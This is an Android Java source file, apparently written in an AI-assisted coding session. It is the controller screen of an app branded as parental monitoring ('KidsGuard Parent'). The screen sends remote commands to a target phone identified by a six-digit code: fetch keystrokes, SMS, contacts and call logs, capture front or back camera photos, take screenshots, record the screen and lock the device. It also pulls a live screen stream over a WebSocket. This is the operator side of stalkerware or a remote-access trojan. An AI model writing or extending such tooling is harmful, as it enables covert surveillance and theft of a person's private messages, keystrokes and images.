package com.kidsguard.parent;

import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.nio.ByteBuffer;

public class RemoteControlActivity extends Activity {
    private static final String TAG = "RemoteControlActivity";

    private EditText etDeviceCode;
    private EditText etChildIp;
    private ImageView ivLiveScreen;
    private TextView tvStatus;
    private WebSocketClient webSocketClient;
    private String currentDeviceCode = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);
        scrollView.setBackgroundColor(0xFF0D0D1A);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("KidsGuard Parent Remote Control");
        title.setTextSize(22);
        title.setTextColor(0xFFFFFFFF);
        title.setPadding(0, 0, 0, 20);
        root.addView(title);

        etDeviceCode = new EditText(this);
        etDeviceCode.setHint("Enter Child 6-Digit Code");
        etDeviceCode.setHintTextColor(0xFF888888);
        etDeviceCode.setTextColor(0xFF00FF88);
        root.addView(etDeviceCode);

        etChildIp = new EditText(this);
        etChildIp.setHint("Child IP for Live Stream (e.g. 192.168.1.5)");
        etChildIp.setHintTextColor(0xFF888888);
        etChildIp.setTextColor(0xFFFFFFFF);
        root.addView(etChildIp);

        LinearLayout streamControlLayout = new LinearLayout(this);
        streamControlLayout.setOrientation(LinearLayout.HORIZONTAL);
        streamControlLayout.setPadding(0, 16, 0, 16);

        Button btnStartStream = new Button(this);
        btnStartStream.setText("Connect Stream");
        btnStartStream.setOnClickListener(v -> startLiveStream());
        streamControlLayout.addView(btnStartStream);

        Button btnStopStream = new Button(this);
        btnStopStream.setText("Stop Stream");
        btnStopStream.setOnClickListener(v -> stopLiveStream());
        streamControlLayout.addView(btnStopStream);

        root.addView(streamControlLayout);

        tvStatus = new TextView(this);
        tvStatus.setText("Status: Disconnected");
        tvStatus.setTextColor(0xFFAAAAAA);
        tvStatus.setPadding(0, 0, 0, 16);
        root.addView(tvStatus);

        ivLiveScreen = new ImageView(this);
        ivLiveScreen.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 800));
        ivLiveScreen.setBackgroundColor(0xFF1E1E2E);
        ivLiveScreen.setScaleType(ImageView.ScaleType.FIT_CENTER);
        root.addView(ivLiveScreen);

        TextView cmdTitle = new TextView(this);
        cmdTitle.setText("Quick Commands");
        cmdTitle.setTextSize(18);
        cmdTitle.setTextColor(0xFFFFFFFF);
        cmdTitle.setPadding(0, 24, 0, 16);
        root.addView(cmdTitle);

        addCommandButton(root, "Locate Child", "get_location", "");
        addCommandButton(root, "Take Screenshot", "screenshot", "");
        addCommandButton(root, "Capture Front Camera", "camera", "front");
        addCommandButton(root, "Capture Back Camera", "camera", "back");
        addCommandButton(root, "Trigger Alarm (Toggle)", "send_alarm", "");
        addCommandButton(root, "Vibrate Device", "vibrate_device", "");
        addCommandButton(root, "Lock Screen", "lock_screen", "");
        addCommandButton(root, "Fetch Keystrokes", "get_keylog", "");
        addCommandButton(root, "Fetch Contacts", "get_contacts", "");
        addCommandButton(root, "Fetch Call Logs", "get_call_logs", "");
        addCommandButton(root, "Fetch SMS", "get_sms", "");
        addCommandButton(root, "Start Screen Recording", "start_screen_record", "");
        addCommandButton(root, "Stop Screen Recording", "stop_screen_record", "");

        scrollView.addView(root);
        setContentView(scrollView);
    }

    private void addCommandButton(LinearLayout parent, String label, final String cmd, final String arg) {
        Button btn = new Button(this);
        btn.setText(label);
        btn.setOnClickListener(v -> {
            String code = etDeviceCode.getText().toString().trim();
            if (code.isEmpty()) {
                Toast.makeText(RemoteControlActivity.this, "Please enter Child Device Code", Toast.LENGTH_SHORT).show();
                return;
            }
            FirebaseHelper.sendCommand(code, cmd, arg);
            Toast.makeText(RemoteControlActivity.this, "Sent: " + cmd, Toast.LENGTH_SHORT).show();
        });
        parent.addView(btn);
    }

    private void startLiveStream() {
        String ip = etChildIp.getText().toString().trim();
        if (ip.isEmpty()) {
            Toast.makeText(this, "Enter child IP address", Toast.LENGTH_SHORT).show();
            return;
        }

        stopLiveStream();

        try {
            URI uri = new URI("ws://" + ip + ":8080");
            webSocketClient = new WebSocketClient(uri) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    runOnUiThread(() -> tvStatus.setText("Status: Stream Connected"));
                }

                @Override
                public void onMessage(String message) {}

                @Override
                public void onMessage(ByteBuffer bytes) {
                    // Turn 2 bug fix: decode JPEG bytes directly into Bitmap
                    byte[] data = new byte[bytes.remaining()];
                    bytes.get(data);
                    final Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
                    if (bmp != null) {
                        runOnUiThread(() -> ivLiveScreen.setImageBitmap(bmp));
                    }
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    runOnUiThread(() -> tvStatus.setText("Status: Stream Closed (" + reason + ")"));
                }

                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "WebSocket error", ex);
                    runOnUiThread(() -> tvStatus.setText("Status: Stream Error - " + ex.getMessage()));
                }
            };
            webSocketClient.connect();
        } catch (Exception e) {
            Toast.makeText(this, "Connect failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void stopLiveStream() {
        if (webSocketClient != null) {
            try {
                webSocketClient.close();
            } catch (Exception ignored) {}
            webSocketClient = null;
        }
        tvStatus.setText("Status: Disconnected");
    }

    @Override
    protected void onDestroy() {
        stopLiveStream();
        super.onDestroy();
    }
}
